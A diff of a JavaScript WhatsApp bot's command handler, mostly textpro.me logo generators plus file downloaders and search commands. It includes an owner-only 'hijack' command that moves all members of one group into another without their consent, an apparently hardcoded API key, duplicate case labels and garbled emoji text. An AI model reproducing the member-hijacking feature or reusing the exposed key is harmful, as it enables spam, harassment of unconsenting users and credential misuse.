+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+    
+case 'bokeh':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+   
+   
+
+case 'holographic':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+
+
+case 'bear':
+
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'wolf':
+
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'joker':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'dropwater2':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+   
+   case 'summertime':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'neonlight2':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'thewall':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+   
+case 'natural':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break 
+
+case 'carbon':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'pencil':
+if(!q) throw`Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'textmaker': {
+   
+if (args.length < 1) throw `Example :\n${prefix + command} <name>`
+if (args[0] === 'glitch') {
+if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
+let teds = await thiccysapi.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [args[1]])
+XeonBotInc.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
+} else if (args[0] === 'glow') {
+if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
+let teds = await thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [args[1]])
+XeonBotInc.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
+} else {
+m.reply(`*Text Maker List :*\n🔖€¢> glitch\n🔖€¢> glow`)
+}
+}
+break
+//logo maker
+case 'hoorror':{
+
+     let link = `https://textpro.me/horror-blood-text-effect-online-883.html`
+     let anui = await textpro(link, q)
+     m.reply(`Wait a moment while making the logo about 1 minute`) 
+     console.log(anui)
+    XeonBotInc.sendMessage(from, {image:{url:anui}, caption:"Here you go! 🏃🏻‍♂️ 🏃🏻‍♂️"}, {quoted:m})
+}
+   break
+case 'whitebear':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'thunder2':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+   break
+case 'blackpink':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'neon':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/neon-light-text-effect-online-882.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'matrix2':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'sky':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'magma':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'sand':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'pencil':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'graffiti':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'metallic':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'steel':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'harrpotter':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'underwater':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/3d-underwater-text-effect-generator-online-1013.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'luxury':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'glue2':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'fabric':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'neonlight':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'lava':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/lava-text-effect-online-914.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'toxic':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/toxic-text-effect-online-901.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'ancient':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'christmas2':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/sparkles-merry-christmas-text-effect-1054.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'sci_fi':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'rainbow':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'classic':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'watercolor2':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'halloweem2':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'halloweenfire':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/halloween-fire-text-effect-940.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'writing':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'foggy':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'marvel':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'skeleton2':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'sketch':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'wonderful':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'cool':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'collwall':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-cool-wall-graffiti-text-effect-online-1009.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'multicolor2':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'batman':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'juice':
+   
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/fruit-juice-text-effect-861.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+case 'pornhub':{
+	
+if(!q) throw `Example: ${prefix + command} ajg | ea`
+m.reply(mess.wait)
+  inilogo4 = args.join(" ")
+inilogo9 = args.join(" ")
+   var logo4 = inilogo4.split('|')[0]
+var logo9 = inilogo9.split('|')[1]
+    let anu = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
+console.log(anu)
+XeonBotInc.sendMessage(from,{image:{url:anu}, caption:"Here you go! 🏃🏻‍♂️"},{quoted:m})
+}
+break
+case 'retro':{
+if(!q) throw `Example: ${prefix + command} ajg | ea`
+m.reply(mess.wait)
+  inilogo4 = args.join(" ")
+inilogo9 = args.join(" ")
+   var logo4 = inilogo4.split('|')[0]
+var logo9 = inilogo9.split('|')[1]
+    let anu = await textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
+console.log(anu)
+XeonBotInc.sendMessage(from,{image:{url:anu}, caption:"Here you go! 🏃🏻‍♂️"},{quoted:m})
+}
+break
+case 'horror':{
+if(!q) throw `Example: ${prefix + command} ajg | ea`
+m.reply(mess.wait)
+  inilogo4 = args.join(" ")
+inilogo9 = args.join(" ")
+   var logo4 = inilogo4.split('|')[0]
+var logo9 = inilogo9.split('|')[1]
+    let anu = await textpro("https://textpro.me/create-a-cinematic-horror-text-effect-1045.html", [`${logo4}`,`${logo9}`])
+console.log(anu)
+XeonBotInc.sendMessage(from,{image:{url:anu}, caption:"Here you go! 🏃🏻‍♂️"},{quoted:m})
+}
+break
+case '8bit':{
+if(!q) throw `Example: ${prefix + command} ajg | ea`
+m.reply(mess.wait)
+  inilogo4 = args.join(" ")
+inilogo9 = args.join(" ")
+   var logo4 = inilogo4.split('|')[0]
+var logo9 = inilogo9.split('|')[1]
+    let anu = await textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
+console.log(anu)
+XeonBotInc.sendMessage(from,{image:{url:anu}, caption:"Here you go! 🏃🏻‍♂️"},{quoted:m})
+}
+break
+case 'mediafire': {
+if (!text) throw mess.linkm
+if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
+const { mediafireDl } = require('./lib/mediafire.js')
+const baby1 = await mediafireDl(text)
+if (baby1[0].size.split('MB')[0] >= 999) return m.reply('*File Over Limit* '+util.format(baby1))
+const result4 = `*MEDIAFIRE DOWNLOADER*
+				
+*Name* : ${baby1[0].nama}
+*Size* : ${baby1[0].size}
+*Mime* : ${baby1[0].mime}
+*Link* : ${baby1[0].link}`
+m.reply(`${result4}`)
+XeonBotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
+}
+break
+            case 'soundcloud': case 'scdl': {               
+                if (!text) throw mess.linkm
+                if (!isUrl(args[0]) && !args[0].includes('soundcloud.com')) throw `*Not a soundcloud link*`
+                xfar.SoundCloud(`${text}`).then(async (data) => {
+                    let txt = `*SOUNDCLOUD DOWNLOADER*\n\n`
+                    txt += `*${themeemoji}Title :* ${data.title}\n`
+                    txt += `*${themeemoji}Quality :* ${data.medias[0].quality}\n`
+                    txt += `*${themeemoji}Type :* ${data.medias[0].extension}\n`
+                    txt += `*${themeemoji}Size :* ${data.medias[0].formattedSize}\n`
+                    txt += `*${themeemoji}Url Source :* ${data.url}\n\n`
+                    txt += `*${botname}*`
+                buf = await getBuffer(data.thumbnail)   
+                XeonBotInc.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m }).catch((err) => m.reply(mess.error))    
+                XeonBotInc.sendMessage(m.chat, { audio: { url: data.medias[0].url }, mimetype: 'audio/mpeg', fileName: data.title+'.m4a' }, { quoted: m })
+                }).catch((err) => {
+                    m.reply(mess.error)
+                })
+            }
+            break
+case 'git': case 'gitclone':
+	m.reply(mess.wait)
+            let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
+            if (!args[0]) throw `Use ${prefix}gitclone repo link\nExample: https://github.com/DGXeon/CheemsBot-MD4`
+    if (!regex1.test(args[0])) throw mess.linkm
+    let [, user, repo] = args[0].match(regex1) || []
+    repo = repo.replace(/.git$/, '')
+    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
+    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
+    XeonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => m.reply(mess.error))
+    break
+case 'hijack':{
+  if(!isCreator) throw mess.owner
+  let text1 = q.split("|")[0]
+  let text2 = q.split("|")[1]
+  if(!text1) throw `Example:\n${order +' 1234567890@g.us|_amount_'}`
+  if(!text2) throw `Example:\n${order +' 1234567890@g.us|_amount_'}`
+  XeonBotInc.sendMessage(text1, { text: `Member kidnapping request by @${msg.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [msg.sender] },{ quoted : msg })               
+  await XeonBotInc.sendMessage(from, { text: `Member kidnapping request by @${msg.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [msg.sender] },{ quoted : msg })                
+  await m.sequestrar(text1, groupMembers.map(mem => mem.id), text2)
+  }
+  break
+case 'repeat':{
+                let text1 = q.split("|")[0]
+                let text2 = q.split("|")[1]
+                  if (!text1) return m.reply(`Example! : ${order + ' ' + 'test|30'}`)    
+                  if (!text2) return m.reply(`Example! : ${order + ' ' + 'test|30'}`)
+                  let txtzh = `${text1}`.repeat(text2)
+               m.reply(txtzh)
+              }
+           break
+case 'id':{
+            m.reply(from)
+           }
+          break
+  case 'pinsticker': case 'pinstick': case 'pintereststicker':{
+   if (args.length < 1) return m.reply('What picture are you looking for?')
+     XeonBotInc.sendMessage(from, { react: { text: "🔖±ï¸", key: m.key }})
+     try{
+   const pint = await pinterest(`${q}`)
+     let xm_za = pint[Math.floor(Math.random() * pint.length)];
+       console.log(xm_za)      
+     let hek = await getBuffer(xm_za)
+     let buffers = await writeExifImg(hek, { packname: global.packname, author: global.author })
+       await XeonBotInc.sendMessage(from, { sticker: { url: buffers } }, { quoted: m })
+       } catch (e) { e = String(e)
+      m.reply('Not found!')
+   }
+  }
+  break
+ case 'tinyurl':{
+   if(!q) return m.reply('link?')
+   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
+   try {
+  m.reply(body)
+  } catch (e) {
+  m.reply(e)
+  }
+  })
+  }
+ break
+case 'img':
+case 'image': {
+                m.reply(mess.wait)
+		let { pinterest } = require('./lib/scraperW')
+                anu = await pinterest(text)
+                resultkkk3 = anu[Math.floor(Math.random() * anu.length)]
+                XeonBotInc.sendMessage(m.chat, { image: { url: resultkkk3 }, caption: ` ${themeemoji} Media Url : `+resultkkk3 }, { quoted: m })
+            }
+            break
+case 'film': case 'movie':
+	m.reply(mess.wait)
+if (!q) return m.reply(`What film you wanna search?\nExample: ${prefix}film Spiderman`)
+xfar.Film(q)
+    .then(data => {console.log(data)
+    let krl = `*🔖’ã€Œ  Film ${q} ã€*\n*🔖Œ¿ Author* : ${data[0].author}\n\n`
+			    for (let i of data) {
+                krl += (`\n🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€\n\n *🔖“Title :* ${i.judul}\n *🔖“Ÿ Quality :* ${i.quality}\n *🔖–¥ï¸ Type : ${i.type}*\n *🔖Œ› Uploaded :* ${i.upload}\n *🔖Œ Source :* ${i.link}`)
+                }
+               XeonBotInc.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdoc })
+});
+break
+case 'zippyshare': {
+if (!text) return m.reply(mess.linkm)
+if (!isUrl(args[0]) && !args[0].includes('zippyshare.com')) return m.reply(`The link is not a zippyshare link`)
+anu = await fetchJson(`https://violetics.pw/api/downloader/zippyshare?apikey=df7d-425a-3bc8&url=${text}`)
+m.reply(`*${util.format(anu)}*`)
+linkyke = await getBuffer(anu.result.dlink)
+XeonBotInc.sendMessage(m.chat, {document: linkyke, mimetype: 'application/zip', fileName: `${anu.result.filename}`}, {quoted:m}).catch ((err) => m.reply(mess.error))     
+}
+break
+case 'happymod': {
+if (!args.join(" ")) return m.reply(`Example : ${prefix + command} mobile legend`)
+xeontod.happymod(args.join(" ")).then(async(res) => {
+teks = '```ã€Œ HappyMod Search ã€```'
+for (let i of res) {
+teks += `\n\n${i.name}\n`
+teks += `${i.link}`
+}
+let buttons = [
+{buttonId: `menu`, buttonText: {displayText: 'Menu🔖¥€'}, type: 1}
+]
+let buttonMessage = {
+image: {url:res[0].icon},
+jpegThumbnail: thum,
+caption: teks,
+footer: `${global.botname}`,
+buttons: buttons,
+headerType: 4
+}
+XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+})
+}
+break
+case 'servermc': {
+xeontod.servermc().then(async(res) => {
+let teks = '*| MINECRAFT SERVER |*\n\nhttps://minecraftpocket-servers.com/country/indonesia/\n\n'
+let no = 1
+for (let i of res) {
+teks += `${themeemoji} Server To ${no++}\nip : ${i.ip}\nport : ${i.port}\nversi : ${i.versi}\nplayer : ${i.player}\n\n`
+}
+let buttons = [
+{buttonId: `menu`, buttonText: {displayText: 'Menu🔖¥€'}, type: 1}
+]
+let buttonMessage = {
+image: log0,
+jpegThumbnail: thum,
+caption: teks,
+footer: `${global.botname}`,
+buttons: buttons,
+headerType: 4
+}
+XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+})
+}
+break
+case 'mcpedl': {
+if (!args.join(" ")) return m.reply(`Example : ${prefix + command} shader`)
+xeontod.mcpedl(args.join(" ")).then(async(res) => {
+teks = `*| MCPEDL SEARCH |*`
+for (let i of res) {
+teks += `\n\nName : ${i.name}\nCategory : ${i.category}\nDate : ${i.date}\nDesc : ${i.desc}\nLink : ${i.link}`
+}
+let buttons = [
+{buttonId: `menu`, buttonText: {displayText: 'Menu🔖¥€'}, type: 1}
+]
+let buttonMessage = {
+image: log0,
